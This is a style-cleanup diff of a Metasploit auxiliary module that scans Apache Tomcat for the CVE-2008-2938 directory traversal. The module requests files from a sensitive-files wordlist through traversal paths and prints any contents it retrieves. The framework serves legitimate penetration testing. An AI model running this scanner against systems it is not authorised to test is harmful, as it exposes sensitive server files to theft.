@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::WmapScanServer
   include Msf::Auxiliary::Scanner
@@ -30,9 +30,9 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'http://tomcat.apache.org/' ],
           [ 'OSVDB', '47464' ],
           [ 'CVE', '2008-2938' ],
-          [ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],
+          [ 'URL', 'http://www.securityfocus.com/archive/1/499926' ]
         ],
-      'Author'         => [ 'patrick','guerrino <ruggine> di massa' ],
+      'Author'         => [ 'patrick', 'guerrino <ruggine> di massa' ],
       'License'        => MSF_LICENSE,
       'DisclosureDate' => 'Jan 9 2009'
     )
@@ -40,23 +40,22 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8080),
-        OptPath.new('SENSITIVE_FILES',  [ true, "File containing senstive files, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
-        OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7]),
-      ], self.class)
+        OptPath.new('SENSITIVE_FILES', [ true, "File containing senstive files, one per line",
+                                         File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
+        OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7])
+      ], self.class
+    )
   end
 
   def extract_words(wordfile)
     return [] unless wordfile && File.readable?(wordfile)
     begin
-      words = File.open(wordfile, "rb") do |f|
-        f.read
-      end
+      words = File.open(wordfile, "rb", &:read)
     rescue
       return []
     end
     save_array = words.split(/\r?\n/)
-    return save_array
+    save_array
   end
 
   def find_files(files)
@@ -67,19 +66,20 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_raw(
         {
           'method'  => 'GET',
-          'uri'     => try + files,
-          }, 25)
-      if (res and res.code == 200)
+          'uri'     => try + files
+        }, 25
+      )
+      if res && (res.code == 200)
         print_status("Request ##{level} may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n#{res.body}")
         @files_found << files
         break
-      elsif (res and res.code)
+      elsif res && res.code
         vprint_error("Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
       end
     end
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     @files_found = []
 
     begin
@@ -87,16 +87,17 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_raw(
         {
           'method'  => 'GET',
-          'uri'     => '/',
-        }, 25)
+          'uri'     => '/'
+        }, 25
+      )
 
-      if (res)
+      if res
         extract_words(datastore['SENSITIVE_FILES']).each do |files|
           find_files(files) unless files.empty?
         end
       end
 
-      if not @files_found.empty?
+      if !@files_found.empty?
         print_good("File(s) found:")
 
         @files_found.each do |f|
